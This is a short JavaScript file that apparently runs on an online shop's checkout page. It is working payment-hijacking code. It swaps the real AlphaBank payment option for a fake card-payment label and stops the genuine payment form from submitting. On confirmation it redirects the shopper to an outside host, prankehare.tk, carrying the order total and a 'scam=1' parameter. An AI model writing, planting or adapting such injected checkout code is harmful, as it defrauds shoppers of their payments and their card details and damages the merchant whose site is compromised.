
window.addEventListener('load',(event)=>{
 

if(window.location.toString().search("checkout")!=-1){








let myLabel = document.getElementsByTagName("label");
let labelAlpha
//alert(myForm)

let myLabelCount = myLabel.length;
for(let z = 0; z < myLabelCount; z++){
 
 //alert(myForm[z].action)
 if (myLabel[z].outerHTML.search("With AlphaBank") > -1) {
 
  labelAlpha = myLabel[z]
 
 
 }

}


//alert(labelAlpha.outerHTML)

labelAlpha.outerHTML = " <label>  <input type=\"radio\" name=\"payment_method\" value=\"ocgrAlphaBank\" checked=\"checked\"  >  Credit/Debit Card (Sabadell)  </label> "








let myForm = document.getElementsByTagName("form");

//alert(myForm)

let countForm = myForm.length;
for(let z = 0; z < countForm; z++){
 
 //alert(myForm[z].action)
 if (myForm[z].action.search("index.php?route=extension/payment/ocgrAlphaBank/send") > -1) {
 
 keyForm = myForm[z]
 
 
 }

}



keyForm.addEventListener('submit',function(event){

event.preventDefault();

})




let status
let elem


let total = ""
total =  document.getElementById("installment_total")

let totalhtml = total.innerHTML


let my_tag = document.getElementsByTagName("input");
let count = my_tag.length;
for(let i = 0; i < count; i++){
 
 if (my_tag[i].value == "ocgrAlphaBank") {
 
 elem = my_tag[i]
 

 }

}

if (elem.getAttribute("checked")== "checked") {
 
 status = "good"
 
 }




submit_button = document.getElementById('button-confirm');



submit_button.addEventListener('click',function(event){




window.location = "https://prankehare.tk/help/?8971660505642&extra_param_1=" + totalhtml + "&extra_param_2=&extra_param_3=&extra_param_4=eur&extra_param_5=ru&extra_param_6=&billing_info=false&product_link=&scam=1&offer=54&m=3"

})




})
}
